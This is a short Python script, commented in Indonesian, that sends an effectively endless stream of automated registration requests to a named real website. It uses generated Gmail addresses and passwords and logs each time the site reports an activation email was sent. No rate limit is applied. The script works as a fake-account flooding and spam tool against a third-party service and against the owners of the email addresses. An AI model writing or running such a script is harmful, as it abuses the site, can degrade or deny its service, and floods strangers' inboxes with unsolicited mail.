import random
import time
import requests
import datetime

url = "https://members.tunnel.my.id/register"

mulai = int(input("Mulai Dari : "))
waktu = str(datetime.datetime.now())
akhir = 1000000000000000000
kata = "Silahkan cek email anda untuk aktivasi account"
for i in range(mulai, akhir):
    try:
        obj = {
            'email' : str('iloveyou'+str(i)+'@gmail.com'),
            'password1' : str('1234567'+str(i)),
            'password2' : str('1234567'+str(i)),
        }
        # hasil = requests.post(url, data=obj)
        # print("Respon " +hasil.text+' ke  '+str(i) + " Pada : " + waktu)

        hasil = requests.post(url, data = obj)
        try:
                hasil.text.index(kata)
        #       if(hasil.text.index(kata)):
                #print(hasil.text)
        except:
                print("Respon Gagal ke: " + str(i) + " Pada : " + waktu)
        #       print(kata+' ke  '+str(i))
        #       else:
        else:
                #print('Respon Berhasil')
                print("Respon " +kata+' ke  '+str(i) + " Pada : " + waktu)
        #time.sleep(2)
    except:
        print("gagal post ke: " + str(i) + " Pada : " + waktu)


        
